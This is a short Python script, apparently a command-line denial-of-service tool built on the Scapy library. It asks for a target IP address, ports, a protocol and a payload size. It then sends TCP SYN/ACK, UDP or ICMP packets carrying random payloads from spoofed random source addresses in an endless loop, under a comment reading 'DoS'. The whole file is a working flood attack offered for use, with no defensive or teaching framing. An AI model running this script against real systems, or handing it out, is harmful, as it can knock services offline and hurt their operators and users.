from scapy.all import *
import re
ip_regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

#Check ip address
def check_ip(ip_user):
    global ip_regex
    if(re.search(ip_regex,ip_user)): 
        #print("Valid IP address") 
        return 0
    else: 
        print("Invalid IP address") 
        return 1

#run 

print("Welcome")

#ip address
target_ip = input("Your target ip address: ")
while(check_ip(target_ip)):
    target_ip = input("Your target ip address: ")

#source and destination port
print("\nEnter your source port: ")
sport = input("Source port:")

print("\nEnter your source port: ")
dport = input("Destination port:")

if sport == '': sport = RandShort()
if dport == '': dport = RandShort()

#Protocol of packet 
print('\nProtocol: 1.TCP    2.UDP    3.ICMP')
proto =input('Enter you protocol: ')
while(proto != '1' and proto != '2' and proto != '3'):
    proto =input('Enter you protocol: ')
if(proto == '1'):
    print('Flags: 1. SYN   2. ACK')
    flags = input('Enter your flags: ')
    while(flags != '1' and flags != '2'):
        flags = input('Enter your flags: ')
    if flags == '1':
        flags = 'S'
    else:
        flags = 'A'

#size of raw
size = int(input("Size of Payload: "))

#create packet 
sport = int(sport)
dport = int(dport)
ip = IP(src = RandIP(), dst = target_ip)
#tcp = TCP(sport = sport, dport = dport, flags = flags)

if(proto == '1'):
    packet =ip/TCP(sport = sport, dport = dport, flags = flags)/Raw(RandString(size= size))
elif(proto == '2'):
    packet =ip/UDP(sport = sport, dport = dport)/Raw(RandString(size= size))
    #packet = ip/UDP()/Raw(RandString(size=size))
else: packet = ip/ICMP()/Raw(RandString(size= size))

#DoS
send(packet, loop = 1)
